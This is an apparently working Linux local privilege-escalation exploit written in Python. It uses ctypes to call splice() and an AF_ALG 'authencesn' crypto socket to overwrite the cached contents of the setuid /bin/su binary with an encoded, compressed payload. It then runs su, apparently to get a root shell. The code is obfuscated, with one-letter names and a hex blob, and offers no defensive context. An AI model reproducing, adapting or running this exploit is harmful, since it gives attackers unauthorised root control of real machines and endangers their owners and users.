#!/usr/bin/env python3

# This version utilizes ctypes as a drop in for 'splice()' 
# for exploiting systems with python < 3.10.

import os as g,zlib,socket as s
import ctypes

libc = ctypes.CDLL("libc.so.6", use_errno=True)

_splice = libc.splice
_splice.argtypes = [
    ctypes.c_int, ctypes.c_void_p,
    ctypes.c_int, ctypes.c_void_p,
    ctypes.c_size_t, ctypes.c_uint
]

def splice(fd_in, fd_out, count, offset_src=None, flags=0):
    off_in = None
    if offset_src is not None:
        off_in = ctypes.pointer(ctypes.c_long(offset_src))

    res = _splice(fd_in, off_in, fd_out, None, count, flags)
    if res < 0:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))
    return res
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();splice(f, w, o, offset_src=0);splice(r, u.fileno(), o)
 try:u.recv(8+t)
 except:0
try:f=g.open("/bin/su",0)
except:f=g.open("/usr/bin/su",0)
i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")
